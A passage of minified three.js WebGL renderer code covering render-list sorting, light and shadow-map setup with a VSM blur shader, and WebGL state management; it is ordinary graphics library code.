c=o(h,p,m,E,x,f);m.transmission>0?n.push(c):m.transparent===!0?r.push(c):t.push(c)}function l(h,p,m,E,x,f){const c=o(h,p,m,E,x,f);m.transmission>0?n.unshift(c):m.transparent===!0?r.unshift(c):t.unshift(c)}function d(h,p){t.length>1&&t.sort(h||wf),n.length>1&&n.sort(p||Fa),r.length>1&&r.sort(p||Fa)}function u(){for(let h=e,p=i.length;h<p;h++){const m=i[h];if(m.id===null)break;m.id=null,m.object=null,m.geometry=null,m.material=null,m.group=null}}return{opaque:t,transmissive:n,transparent:r,init:s,push:a,unshift:l,finish:u,sort:d}}function Cf(){let i=new WeakMap;function e(n,r){const s=i.get(n);let o;return s===void 0?(o=new ka,i.set(n,[o])):r>=s.length?(o=new ka,s.push(o)):o=s[r],o}function t(){i=new WeakMap}return{get:e,dispose:t}}function Pf(){const i={};return{get:function(e){if(i[e.id]!==void 0)return i[e.id];let t;switch(e.type){case"DirectionalLight":t={direction:new L,color:new He};break;case"SpotLight":t={position:new L,direction:new L,color:new He,distance:0,coneCos:0,penumbraCos:0,decay:0};break;case"PointLight":t={position:new L,color:new He,distance:0,decay:0};break;case"HemisphereLight":t={direction:new L,skyColor:new He,groundColor:new He};break;case"RectAreaLight":t={color:new He,position:new L,halfWidth:new L,halfHeight:new L};break}return i[e.id]=t,t}}}function If(){const i={};return{get:function(e){if(i[e.id]!==void 0)return i[e.id];let t;switch(e.type){case"DirectionalLight":t={shadowBias:0,shadowNormalBias:0,shadowRadius:1,shadowMapSize:new Be};break;case"SpotLight":t={shadowBias:0,shadowNormalBias:0,shadowRadius:1,shadowMapSize:new Be};break;case"PointLight":t={shadowBias:0,shadowNormalBias:0,shadowRadius:1,shadowMapSize:new Be,shadowCameraNear:1,shadowCameraFar:1e3};break}return i[e.id]=t,t}}}let Lf=0;function Df(i,e){return(e.castShadow?2:0)-(i.castShadow?2:0)+(e.map?1:0)-(i.map?1:0)}function Nf(i,e){const t=new Pf,n=If(),r={version:0,hash:{directionalLength:-1,pointLength:-1,spotLength:-1,rectAreaLength:-1,hemiLength:-1,numDirectionalShadows:-1,numPointShadows:-1,numSpotShadows:-1,numSpotMaps:-1,numLightProbes:-1},ambient:[0,0,0],probe:[],directional:[],directionalShadow:[],directionalShadowMap:[],directionalShadowMatrix:[],spot:[],spotLightMap:[],spotShadow:[],spotShadowMap:[],spotLightMatrix:[],rectArea:[],rectAreaLTC1:null,rectAreaLTC2:null,point:[],pointShadow:[],pointShadowMap:[],pointShadowMatrix:[],hemi:[],numSpotLightShadowsWithMaps:0,numLightProbes:0};for(let u=0;u<9;u++)r.probe.push(new L);const s=new L,o=new Ze,a=new Ze;function l(u,h){let p=0,m=0,E=0;for(let X=0;X<9;X++)r.probe[X].set(0,0,0);let x=0,f=0,c=0,g=0,_=0,v=0,w=0,M=0,T=0,D=0,y=0;u.sort(Df);const R=h===!0?Math.PI:1;for(let X=0,te=u.length;X<te;X++){const P=u[X],z=P.color,W=P.intensity,Y=P.distance,H=P.shadow&&P.shadow.map?P.shadow.map.texture:null;if(P.isAmbientLight)p+=z.r*W*R,m+=z.g*W*R,E+=z.b*W*R;else if(P.isLightProbe){for(let V=0;V<9;V++)r.probe[V].addScaledVector(P.sh.coefficients[V],W);y++}else if(P.isDirectionalLight){const V=t.get(P);if(V.color.copy(P.color).multiplyScalar(P.intensity*R),P.castShadow){const q=P.shadow,Q=n.get(P);Q.shadowBias=q.bias,Q.shadowNormalBias=q.normalBias,Q.shadowRadius=q.radius,Q.shadowMapSize=q.mapSize,r.directionalShadow[x]=Q,r.directionalShadowMap[x]=H,r.directionalShadowMatrix[x]=P.shadow.matrix,v++}r.directional[x]=V,x++}else if(P.isSpotLight){const V=t.get(P);V.position.setFromMatrixPosition(P.matrixWorld),V.color.copy(z).multiplyScalar(W*R),V.distance=Y,V.coneCos=Math.cos(P.angle),V.penumbraCos=Math.cos(P.angle*(1-P.penumbra)),V.decay=P.decay,r.spot[c]=V;const q=P.shadow;if(P.map&&(r.spotLightMap[T]=P.map,T++,q.updateMatrices(P),P.castShadow&&D++),r.spotLightMatrix[c]=q.matrix,P.castShadow){const Q=n.get(P);Q.shadowBias=q.bias,Q.shadowNormalBias=q.normalBias,Q.shadowRadius=q.radius,Q.shadowMapSize=q.mapSize,r.spotShadow[c]=Q,r.spotShadowMap[c]=H,M++}c++}else if(P.isRectAreaLight){const V=t.get(P);V.color.copy(z).multiplyScalar(W),V.halfWidth.set(P.width*.5,0,0),V.halfHeight.set(0,P.height*.5,0),r.rectArea[g]=V,g++}else if(P.isPointLight){const V=t.get(P);if(V.color.copy(P.color).multiplyScalar(P.intensity*R),V.distance=P.distance,V.decay=P.decay,P.castShadow){const q=P.shadow,Q=n.get(P);Q.shadowBias=q.bias,Q.shadowNormalBias=q.normalBias,Q.shadowRadius=q.radius,Q.shadowMapSize=q.mapSize,Q.shadowCameraNear=q.camera.near,Q.shadowCameraFar=q.camera.far,r.pointShadow[f]=Q,r.pointShadowMap[f]=H,r.pointShadowMatrix[f]=P.shadow.matrix,w++}r.point[f]=V,f++}else if(P.isHemisphereLight){const V=t.get(P);V.skyColor.copy(P.color).multiplyScalar(W*R),V.groundColor.copy(P.groundColor).multiplyScalar(W*R),r.hemi[_]=V,_++}}g>0&&(e.isWebGL2?i.has("OES_texture_float_linear")===!0?(r.rectAreaLTC1=ie.LTC_FLOAT_1,r.rectAreaLTC2=ie.LTC_FLOAT_2):(r.rectAreaLTC1=ie.LTC_HALF_1,r.rectAreaLTC2=ie.LTC_HALF_2):i.has("OES_texture_float_linear")===!0?(r.rectAreaLTC1=ie.LTC_FLOAT_1,r.rectAreaLTC2=ie.LTC_FLOAT_2):i.has("OES_texture_half_float_linear")===!0?(r.rectAreaLTC1=ie.LTC_HALF_1,r.rectAreaLTC2=ie.LTC_HALF_2):console.error("THREE.WebGLRenderer: Unable to use RectAreaLight. Missing WebGL extensions.")),r.ambient[0]=p,r.ambient[1]=m,r.ambient[2]=E;const k=r.hash;(k.directionalLength!==x||k.pointLength!==f||k.spotLength!==c||k.rectAreaLength!==g||k.hemiLength!==_||k.numDirectionalShadows!==v||k.numPointShadows!==w||k.numSpotShadows!==M||k.numSpotMaps!==T||k.numLightProbes!==y)&&(r.directional.length=x,r.spot.length=c,r.rectArea.length=g,r.point.length=f,r.hemi.length=_,r.directionalShadow.length=v,r.directionalShadowMap.length=v,r.pointShadow.length=w,r.pointShadowMap.length=w,r.spotShadow.length=M,r.spotShadowMap.length=M,r.directionalShadowMatrix.length=v,r.pointShadowMatrix.length=w,r.spotLightMatrix.length=M+T-D,r.spotLightMap.length=T,r.numSpotLightShadowsWithMaps=D,r.numLightProbes=y,k.directionalLength=x,k.pointLength=f,k.spotLength=c,k.rectAreaLength=g,k.hemiLength=_,k.numDirectionalShadows=v,k.numPointShadows=w,k.numSpotShadows=M,k.numSpotMaps=T,k.numLightProbes=y,r.version=Lf++)}function d(u,h){let p=0,m=0,E=0,x=0,f=0;const c=h.matrixWorldInverse;for(let g=0,_=u.length;g<_;g++){const v=u[g];if(v.isDirectionalLight){const w=r.directional[p];w.direction.setFromMatrixPosition(v.matrixWorld),s.setFromMatrixPosition(v.target.matrixWorld),w.direction.sub(s),w.direction.transformDirection(c),p++}else if(v.isSpotLight){const w=r.spot[E];w.position.setFromMatrixPosition(v.matrixWorld),w.position.applyMatrix4(c),w.direction.setFromMatrixPosition(v.matrixWorld),s.setFromMatrixPosition(v.target.matrixWorld),w.direction.sub(s),w.direction.transformDirection(c),E++}else if(v.isRectAreaLight){const w=r.rectArea[x];w.position.setFromMatrixPosition(v.matrixWorld),w.position.applyMatrix4(c),a.identity(),o.copy(v.matrixWorld),o.premultiply(c),a.extractRotation(o),w.halfWidth.set(v.width*.5,0,0),w.halfHeight.set(0,v.height*.5,0),w.halfWidth.applyMatrix4(a),w.halfHeight.applyMatrix4(a),x++}else if(v.isPointLight){const w=r.point[m];w.position.setFromMatrixPosition(v.matrixWorld),w.position.applyMatrix4(c),m++}else if(v.isHemisphereLight){const w=r.hemi[f];w.direction.setFromMatrixPosition(v.matrixWorld),w.direction.transformDirection(c),f++}}}return{setup:l,setupView:d,state:r}}function za(i,e){const t=new Nf(i,e),n=[],r=[];function s(){n.length=0,r.length=0}function o(h){n.push(h)}function a(h){r.push(h)}function l(h){t.setup(n,h)}function d(h){t.setupView(n,h)}return{init:s,state:{lightsArray:n,shadowsArray:r,lights:t},setupLights:l,setupLightsView:d,pushLight:o,pushShadow:a}}function Of(i,e){let t=new WeakMap;function n(s,o=0){const a=t.get(s);let l;return a===void 0?(l=new za(i,e),t.set(s,[l])):o>=a.length?(l=new za(i,e),a.push(l)):l=a[o],l}function r(){t=new WeakMap}return{get:n,dispose:r}}class Uf extends gi{constructor(e){super(),this.isMeshDepthMaterial=!0,this.type="MeshDepthMaterial",this.depthPacking=Pl,this.map=null,this.alphaMap=null,this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.wireframe=!1,this.wireframeLinewidth=1,this.setValues(e)}copy(e){return super.copy(e),this.depthPacking=e.depthPacking,this.map=e.map,this.alphaMap=e.alphaMap,this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this}}class Ff extends gi{constructor(e){super(),this.isMeshDistanceMaterial=!0,this.type="MeshDistanceMaterial",this.map=null,this.alphaMap=null,this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.setValues(e)}copy(e){return super.copy(e),this.map=e.map,this.alphaMap=e.alphaMap,this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this}}const kf=`void main() {
	gl_Position = vec4( position, 1.0 );
}`,zf=`uniform sampler2D shadow_pass;
uniform vec2 resolution;
uniform float radius;
#include <packing>
void main() {
	const float samples = float( VSM_SAMPLES );
	float mean = 0.0;
	float squared_mean = 0.0;
	float uvStride = samples <= 1.0 ? 0.0 : 2.0 / ( samples - 1.0 );
	float uvStart = samples <= 1.0 ? 0.0 : - 1.0;
	for ( float i = 0.0; i < samples; i ++ ) {
		float uvOffset = uvStart + i * uvStride;
		#ifdef HORIZONTAL_PASS
			vec2 distribution = unpackRGBATo2Half( texture2D( shadow_pass, ( gl_FragCoord.xy + vec2( uvOffset, 0.0 ) * radius ) / resolution ) );
			mean += distribution.x;
			squared_mean += distribution.y * distribution.y + distribution.x * distribution.x;
		#else
			float depth = unpackRGBAToDepth( texture2D( shadow_pass, ( gl_FragCoord.xy + vec2( 0.0, uvOffset ) * radius ) / resolution ) );
			mean += depth;
			squared_mean += depth * depth;
		#endif
	}
	mean = mean / samples;
	squared_mean = squared_mean / samples;
	float std_dev = sqrt( squared_mean - mean * mean );
	gl_FragColor = pack2HalfToRGBA( vec2( mean, std_dev ) );
}`;function Bf(i,e,t){let n=new Mo;const r=new Be,s=new Be,o=new ct,a=new Uf({depthPacking:Il}),l=new Ff,d={},u=t.maxTextureSize,h={[cn]:Et,[Et]:cn,[Ut]:Ut},p=new An({defines:{VSM_SAMPLES:8},uniforms:{shadow_pass:{value:null},resolution:{value:new Be},radius:{value:4}},vertexShader:kf,fragmentShader:zf}),m=p.clone();m.defines.HORIZONTAL_PASS=1;const E=new It;E.setAttribute("position",new zt(new Float32Array([-1,-1,.5,3,-1,.5,-1,3,.5]),3));const x=new Ht(E,p),f=this;this.enabled=!1,this.autoUpdate=!0,this.needsUpdate=!1,this.type=eo;let c=this.type;this.render=function(M,T,D){if(f.enabled===!1||f.autoUpdate===!1&&f.needsUpdate===!1||M.length===0)return;const y=i.getRenderTarget(),R=i.getActiveCubeFace(),k=i.getActiveMipmapLevel(),X=i.state;X.setBlending(an),X.buffers.color.setClear(1,1,1,1),X.buffers.depth.setTest(!0),X.setScissorTest(!1);const te=c!==Kt&&this.type===Kt,P=c===Kt&&this.type!==Kt;for(let z=0,W=M.length;z<W;z++){const Y=M[z],H=Y.shadow;if(H===void 0){console.warn("THREE.WebGLShadowMap:",Y,"has no shadow.");continue}if(H.autoUpdate===!1&&H.needsUpdate===!1)continue;r.copy(H.mapSize);const V=H.getFrameExtents();if(r.multiply(V),s.copy(H.mapSize),(r.x>u||r.y>u)&&(r.x>u&&(s.x=Math.floor(u/V.x),r.x=s.x*V.x,H.mapSize.x=s.x),r.y>u&&(s.y=Math.floor(u/V.y),r.y=s.y*V.y,H.mapSize.y=s.y)),H.map===null||te===!0||P===!0){const Q=this.type!==Kt?{minFilter:gt,magFilter:gt}:{};H.map!==null&&H.map.dispose(),H.map=new Tn(r.x,r.y,Q),H.map.texture.name=Y.name+".shadowMap",H.camera.updateProjectionMatrix()}i.setRenderTarget(H.map),i.clear();const q=H.getViewportCount();for(let Q=0;Q<q;Q++){const $=H.getViewport(Q);o.set(s.x*$.x,s.y*$.y,s.x*$.z,s.y*$.w),X.viewport(o),H.updateMatrices(Y,Q),n=H.getFrustum(),v(T,D,H.camera,Y,this.type)}H.isPointLightShadow!==!0&&this.type===Kt&&g(H,D),H.needsUpdate=!1}c=this.type,f.needsUpdate=!1,i.setRenderTarget(y,R,k)};function g(M,T){const D=e.update(x);p.defines.VSM_SAMPLES!==M.blurSamples&&(p.defines.VSM_SAMPLES=M.blurSamples,m.defines.VSM_SAMPLES=M.blurSamples,p.needsUpdate=!0,m.needsUpdate=!0),M.mapPass===null&&(M.mapPass=new Tn(r.x,r.y)),p.uniforms.shadow_pass.value=M.map.texture,p.uniforms.resolution.value=M.mapSize,p.uniforms.radius.value=M.radius,i.setRenderTarget(M.mapPass),i.clear(),i.renderBufferDirect(T,null,D,p,x,null),m.uniforms.shadow_pass.value=M.mapPass.texture,m.uniforms.resolution.value=M.mapSize,m.uniforms.radius.value=M.radius,i.setRenderTarget(M.map),i.clear(),i.renderBufferDirect(T,null,D,m,x,null)}function _(M,T,D,y){let R=null;const k=D.isPointLight===!0?M.customDistanceMaterial:M.customDepthMaterial;if(k!==void 0)R=k;else if(R=D.isPointLight===!0?l:a,i.localClippingEnabled&&T.clipShadows===!0&&Array.isArray(T.clippingPlanes)&&T.clippingPlanes.length!==0||T.displacementMap&&T.displacementScale!==0||T.alphaMap&&T.alphaTest>0||T.map&&T.alphaTest>0){const X=R.uuid,te=T.uuid;let P=d[X];P===void 0&&(P={},d[X]=P);let z=P[te];z===void 0&&(z=R.clone(),P[te]=z,T.addEventListener("dispose",w)),R=z}if(R.visible=T.visible,R.wireframe=T.wireframe,y===Kt?R.side=T.shadowSide!==null?T.shadowSide:T.side:R.side=T.shadowSide!==null?T.shadowSide:h[T.side],R.alphaMap=T.alphaMap,R.alphaTest=T.alphaTest,R.map=T.map,R.clipShadows=T.clipShadows,R.clippingPlanes=T.clippingPlanes,R.clipIntersection=T.clipIntersection,R.displacementMap=T.displacementMap,R.displacementScale=T.displacementScale,R.displacementBias=T.displacementBias,R.wireframeLinewidth=T.wireframeLinewidth,R.linewidth=T.linewidth,D.isPointLight===!0&&R.isMeshDistanceMaterial===!0){const X=i.properties.get(R);X.light=D}return R}function v(M,T,D,y,R){if(M.visible===!1)return;if(M.layers.test(T.layers)&&(M.isMesh||M.isLine||M.isPoints)&&(M.castShadow||M.receiveShadow&&R===Kt)&&(!M.frustumCulled||n.intersectsObject(M))){M.modelViewMatrix.multiplyMatrices(D.matrixWorldInverse,M.matrixWorld);const te=e.update(M),P=M.material;if(Array.isArray(P)){const z=te.groups;for(let W=0,Y=z.length;W<Y;W++){const H=z[W],V=P[H.materialIndex];if(V&&V.visible){const q=_(M,V,y,R);M.onBeforeShadow(i,M,T,D,te,q,H),i.renderBufferDirect(D,null,te,q,M,H),M.onAfterShadow(i,M,T,D,te,q,H)}}}else if(P.visible){const z=_(M,P,y,R);M.onBeforeShadow(i,M,T,D,te,z,null),i.renderBufferDirect(D,null,te,z,M,null),M.onAfterShadow(i,M,T,D,te,z,null)}}const X=M.children;for(let te=0,P=X.length;te<P;te++)v(X[te],T,D,y,R)}function w(M){M.target.removeEventListener("dispose",w);for(const D in d){const y=d[D],R=M.target.uuid;R in y&&(y[R].dispose(),delete y[R])}}}function Gf(i,e,t){const n=t.isWebGL2;function r(){let C=!1;const se=new ct;let ae=null;const Se=new ct(0,0,0,0);return{setMask:function(xe){ae!==xe&&!C&&(i.colorMask(xe,xe,xe,xe),ae=xe)},setLocked:function(xe){C=xe},setClear:function(xe,Xe,qe,st,ht){ht===!0&&(xe*=st,Xe*=st,qe*=st),se.set(xe,Xe,qe,st),Se.equals(se)===!1&&(i.clearColor(xe,Xe,qe,st),Se.copy(se))},reset:function(){C=!1,ae=null,Se.set(-1,0,0,0)}}}function s(){let C=!1,se=null,ae=null,Se=null;return{setTest:function(xe){xe?Te(i.DEPTH_TEST):ge(i.DEPTH_TEST)},setMask:function(xe){se!==xe&&!C&&(i.depthMask(xe),se=xe)},setFunc:function(xe){if(ae!==xe){switch(xe){case al:i.depthFunc(i.NEVER);break;case ol:i.depthFunc(i.ALWAYS);break;case ll:i.depthFunc(i.LESS);break;case Yi:i.depthFunc(i.LEQUAL);break;case cl:i.depthFunc(i.EQUAL);break;case dl:i.depthFunc(i.GEQUAL);break;case ul:i.depthFunc(i.GREATER);break;case pl:i.depthFunc(i.NOTEQUAL);break;default:i.depthFunc(i.LEQUAL)}ae=xe}},setLocked:function(xe){C=xe},setClear:function(xe){Se!==xe&&(i.clearDepth(xe),Se=xe)},reset:function(){C=!1,se=null,ae=null,Se=null}}}function o(){let C=!1,se=null,ae=null,Se=null,xe=null,Xe=null,qe=null,st=null,ht=null;return{setTest:function(Ye){C||(Ye?Te(i.STENCIL_TEST):ge(i.STENCIL_TEST))},setMask:function(Ye){se!==Ye&&!C&&(i.stencilMask(Ye),se=Ye)},setFunc:function(Ye,mt,Bt){(ae!==Ye||Se!==mt||xe!==Bt)&&(i.stencilFunc(Ye,mt,Bt),ae=Ye,Se=mt,xe=Bt)},setOp:function(Ye,mt,Bt){(Xe!==Ye||qe!==mt||st!==Bt)&&(i.stencilOp(Ye,mt,Bt),Xe=Ye,qe=mt,st=Bt)},setLocked:function(Ye){C=Ye},setClear:function(Ye){ht!==Ye&&(i.clearStencil(Ye),ht=Ye)},reset:function(){C=!1,se=null,ae=null,Se=null,xe=null,Xe=null,qe=null,st=null,ht=null}}}const a=new r,l=new s,d=new o,u=new WeakMap,h=new WeakMap;let p={},m={},E=new WeakMap,x=[],f=null,c=!1,g=null,_=null,v=null,w=null,M=null,T=null,D=null,y=new He(0,0,0),R=0,k=!1,X=null,te=null,P=null,z=null,W=null;const Y=i.getParameter(i.MAX_COMBINED_TEXTURE_IMAGE_UNITS);let H=!1,V=0;const q=i.getParameter(i.VERSION);q.indexOf("WebGL")!==-1?(V=parseFloat(/^WebGL (\d)/.exec(q)[1]),H=V>=1):q.indexOf("OpenGL ES")!==-1&&(V=parseFloat(/^OpenGL ES (\d)/.exec(q)[1]),H=V>=2);let Q=null,$={};const G=i.getParameter(i.SCISSOR_BOX),j=i.getParameter(i.VIEWPORT),re=new ct().fromArray(G),pe=new ct().fromArray(j);function ue(C,se,ae,Se){const xe=new Uint8Array(4),Xe=i.createTexture();i.bindTexture(C,Xe),i.texParameteri(C,i.TEXTURE_MIN_FILTER,i.NEAREST),i.texParameteri(C,i.TEXTURE_MAG_FILTER,i.NEAREST);for(let qe=0;qe<ae;qe++)n&&(C===i.TEXTURE_3D||C===i.TEXTURE_2D_ARRAY)?i.texImage3D(se,0,i.RGBA,1,1,Se,0,i.RGBA,i.UNSIGNED_BYTE,xe):i.texImage2D(se+qe,0,i.RGBA,1,1,0,i.RGBA,i.UNSIGNED_BYTE,xe);return Xe}const Me={};Me[i.TEXTURE_2D]=ue(i.TEXTURE_2D,i.TEXTURE_2D,1),Me[i.TEXTURE_CUBE_MAP]=ue(i.TEXTURE_CUBE_MAP,i.TEXTURE_CUBE_MAP_POSITIVE_X,6),n&&(Me[i.TEXTURE_2D_ARRAY]=ue(i.TEXTURE_2D_ARRAY,i.TEXTURE_2D_ARRAY,1,1),Me[i.TEXTURE_3D]=ue(i.TEXTURE_3D,i.TEXTURE_3D,1,1)),a.setClear(0,0,0,1),l.setClear(1),d.setClear(0),Te(i.DEPTH_TEST),l.setFunc(Yi),Le(!1),A(Es),Te(i.CULL_FACE),fe(an);function Te(C){p[C]!==!0&&(i.enable(C),p[C]=!0)}function ge(C){p[C]!==!1&&(i.disable(C),p[C]=!1)}function Oe(C,se){return m[C]!==se?(i.bindFramebuffer(C,se),m[C]=se,n&&(C===i.DRAW_FRAMEBUFFER&&(m[i.FRAMEBUFFER]=se),C===i.FRAMEBUFFER&&(m[i.DRAW_FRAMEBUFFER]=se)),!0):!1}function N(C,se){let ae=x,Se=!1;if(C)if(ae=E.get(se),ae===void 0&&(ae=[],E.set(se,ae)),C.isWebGLMultipleRenderTargets){const xe=C.texture;if(ae.length!==xe.length||ae[0]!==i.COLOR_ATTACHMENT0){for(let Xe=0,qe=xe.length;Xe<qe;Xe++)ae[Xe]=i.COLOR_ATTACHMENT0+Xe;ae.length=xe.length,Se=!0}}else ae[0]!==i.COLOR_ATTACHMENT0&&(ae[0]=i.COLOR_ATTACHMENT0,Se=!0);else ae[0]!==i.BACK&&(ae[0]=i.BACK,Se=!0);Se&&(t.isWebGL2?i.drawBuffers(ae):e.get("WEBGL_draw_buffers").drawBuffersWEBGL(ae))}function nt(C){return f!==C?(i.useProgram(C),f=C,!0):!1}const ve={[vn]:i.FUNC_ADD,[Xo]:i.FUNC_SUBTRACT,[qo]:i.FUNC_REVERSE_SUBTRACT};if(n)ve[bs]=i.MIN,ve[Ts]=i.MAX;else{const C=e.get("EXT_blend_minmax");C!==null&&(ve[bs]=C.MIN_EXT,ve[Ts]=C.MAX_EXT)}const Re={[Yo]:i.ZERO,[jo]:i.ONE,[Ko]:i.SRC_COLOR,[Yr]:i.SRC_ALPHA,[tl]:i.SRC_ALPHA_SATURATE,[Jo]:i.DST_COLOR,[Zo]:i.DST_ALPHA,[$o]:i.ONE_MINUS_SRC_COLOR,[jr]:i.ONE_MINUS_SRC_ALPHA,[el]:i.ONE_MINUS_DST_COLOR,[Qo]:i.ONE_MINUS_DST_ALPHA,[nl]:i.CONSTANT_COLOR,[il]:i.ONE_MINUS_CONSTANT_COLOR,[rl]:i.CONSTANT_ALPHA,[sl]:i.ONE_MINUS_CONSTANT_ALPHA};function fe(C,se,ae,Se,xe,Xe,qe,st,ht,Ye){if(C===an){c===!0&&(ge(i.BLEND),c=!1);return}if(c===!1&&(Te(i.BLEND),c=!0),C!==Wo){if(C!==g||Ye!==k){if((_!==vn||M!==vn)&&(i.blendEquation(i.FUNC_ADD),_=vn,M=vn),Ye)switch(C){case Yn:i.blendFuncSeparate(i.ONE,i.ONE_MINUS_SRC_ALPHA,i.ONE,i.ONE_MINUS_SRC_ALPHA);break;case ys:i.blendFunc(i.ONE,i.ONE);break;case Ss:i.blendFuncSeparate(i.ZERO,i.ONE_MINUS_SRC_COLOR,i.ZERO,i.ONE);break;case Ms:i.blendFuncSeparate(i.ZERO,i.SRC_COLOR,i.ZERO,i.SRC_ALPHA);break;default:console.error("THREE.WebGLState: Invalid blending: ",C);break}else switch(C){case Yn:i.blendFuncSeparate(i.SRC_ALPHA,i.ONE_MINUS_SRC_ALPHA,i.ONE,i.ONE_MINUS_SRC_ALPHA);break;case ys:i.blendFunc(i.SRC_ALPHA,i.ONE);break;case Ss:i.blendFuncSeparate(i.ZERO,i.ONE_MINUS_SRC_COLOR,i.ZERO,i.ONE);break;case Ms:i.blendFunc(i.ZERO,i.SRC_COLOR);break;default:console.error("THREE.WebGLState: Invalid blending: ",C);break}v=null,w=null,T=null,D=null,y.set(0,0,0),R=0,g=C,k=Ye}return}xe=xe||se,Xe=Xe||ae,qe=qe||Se,(se!==_||xe!==M)&&(i.blendEquationSeparate(ve[se],ve[xe]),_=se,M=xe),(ae!==v||Se!==w||Xe!==T||qe!==D)&&(i.blendFuncSeparate(Re[ae],Re[Se],Re[Xe],Re[qe]),v=ae,w=Se,T=Xe,D=qe),(st.equals(y)===!1||ht!==R)&&(i.blendColor(st.r,st.g,st.b,ht),y.copy(st),R=ht),g=C,k=!1}function Ke(C,se){C.side===Ut?ge(i.CULL_FACE):Te(i.CULL_FACE);let ae=C.side===Et;se&&(ae=!ae),Le(ae),C.blending===Yn&&C.transparent===!1?fe(an):fe(C.blending,C.blendEquation,C.blendSrc,C.blendDst,C.blendEquationAlpha,C.blendSrcAlpha,C.blendDstAlpha,C.blendColor,C.blendAlpha,C.premultipliedAlpha),l.setFunc(C.depthFunc),l.setTest(C.depthTest),l.setMask(C.depthWrite),a.setMask(C.colorWrite);const Se=C.stencilWrite;d.setTest(Se),Se&&(d.setMask(C.stencilWriteMask),d.setFunc(C.stencilFunc,C.stencilRef,C.stencilFuncMask),d.setOp(C.stencilFail,C.stencilZFail,C.stencilZPass)),U(C.polygonOffset,C.polygonOffsetFactor,C.polygonOffsetUnits),C.alphaToCoverage===!0?Te(i.SAMPLE_ALPHA_TO_COVERAGE):ge(i.SAMPLE_ALPHA_TO_COVERAGE)}function Le(C){X!==C&&(C?i.frontFace(i.CW):i.frontFace(i.CCW),X=C)}function A(C){C!==Go?(Te(i.CULL_FACE),C!==te&&(C===Es?i.cullFace(i.BACK):C===Ho?i.cullFace(i.FRONT):i.cullFace(i.FRONT_AND_BACK))):ge(i.CULL_FACE),te=C}function S(C){C!==P&&(H&&i.lineWidth(C),P=C)}function U(C,se,ae){C?(Te(i.POLYGON_OFFSET_FILL),(z!==se||W!==ae)&&(i.polygonOffset(se,ae),z=se,W=ae)):ge(i.POLYGON_OFFSET_FILL)}function J(C){C?Te(i.SCISSOR_TEST):ge(i.SCISSOR_TEST)}function Z(C){C===void 0&&(C=i.TEXTURE0+Y-1),Q!==C&&(i.activeTexture(C),Q=C)}function ee(C,se,ae){ae===void 0&&(Q===null?ae=i.TEXTURE0+Y-1:ae=Q);let Se=$[ae];Se===void 0&&(Se={type:void 0,texture:void 0},$[ae]=Se),(Se.type!==C||Se.texture!==se)&&(Q!==ae&&(i.activeTexture(ae),Q=ae),i.bindTexture(C,se||Me[C]),Se.type=C,Se.texture=se)}function he(){const C=$[Q];C!==void 0&&C.type!==void 0&&(i.bindTexture(C.type,null),C.type=void 0,C.texture=void 0)}function oe(){try{i.compressedTexImage2D.apply(i,arguments)}catch(C){console.error("THREE.WebGLState:",C)}}function ce(){try{i.compressedTexImage3D.apply(i,arguments)}catch(C){console.error("THREE.WebGLState:",C)}}function ye(){try{i.texSubImage2D.apply(i,arguments)}catch(C){console.error("THREE.WebGLState:",C)}}function De(){try{i.texSubImage3D.apply(i,arguments)}catch(C){console.error("THREE.WebGLState:",C)}}function K(){try{i.compressedTexSubImage2D.apply(i,arguments)}catch(C){console.error("THREE.WebGLState:",C)}}function Ve(){try{i.compressedTexSubImage3D.apply(i,arguments)}catch(C){console.error("THREE.WebGLState:",C)}}function ze(){try{i.texStorage2D.apply(i,arguments)}catch(C){console.error("THREE.WebGLState:",C)}}function Ae(){try{i.texStorage3D.apply(i,arguments)}catch(C){console.error("THREE.WebGLState:",C)}}function _e(){try{i.texImage2D.apply(i,arguments)}catch(C){console.error("THREE.WebGLState:",C)}}function de(){try{i.texImage3D.apply(i,arguments)}catch(C){console.error("THREE.WebGLState:",C)}}function Pe(C){re.equals(C)===!1&&(i.scissor(C.x,C.y,C.z,C.w),re.copy(C))}function Ge(C){pe.equals(C)===!1&&(i.viewport(C.x,C.y,C.z,C.w),pe.copy(C))}function Qe(C,se){let ae=h.get(se);ae===void 0&&(ae=new WeakMap,h.set(se,ae));let Se=ae.get(C);Se===void 0&&(Se=i.getUniformBlockIndex(se,C.name),ae.set(C,Se))}function Ue(C,se){const Se=h.get(se).get(C);u.get(se)!==Se&&(i.uniformBlockBinding(se,Se,C.__bindingPointIndex),u.set(se,Se))}function ne(){i.disable(i.BLEND),i.disable(i.CULL_FACE),i.disable(i.DEPTH_TEST),i.disable(i.POLYGON_OFFSET_FILL),i.disable(i.SCISSOR_TEST),i.disable(i.STENCIL_TEST),i.disable(i.SAMPLE_ALPHA_TO_COVERAGE),i.blendEquation(i.FUNC_ADD),i.blendFunc(i.ONE,i.ZERO),i.blendFuncSeparate(i.ONE,i.ZERO,i.ONE,i.ZERO),i.blendColor(0,0,0,0),i.colorMask(!0,!0,!0,!0),i.clearColor(0,0,0,0),i.depthMask(!0),i.depthFunc(i.LESS),i.clearDepth(1),i.stencilMask(4294967295),i.stencilFunc(i.ALWAYS,0,4294967295),i.stencilOp(i.KEEP,i.KEEP,i.KEEP),i.clearStencil(0),i.cullFace(i.BACK),i.frontFace(i.CCW),i.polygonOffset(0,0),i.activeTexture(i.TEXTURE0),i.bindFramebuffer(i.FRAMEBUFFER,null),n===!0&&(i.bindFramebuffer(i.DRAW_FRAMEBUFFER,null),i.bindFramebuffer(i.READ_FRAMEBUFFER,null)),i.useProgram(null),i.lineWidth(1),i.scissor(0,0,i.canvas.width,i.canvas.height),i.viewport(0,0,i.canvas.width,i.canvas.height),p={},Q=null,$={},m={},E=new WeakMap,x=[],f=null,c=!1,g=null,_=null,v=null,w=null,M=null,T=null,D=null,y=new 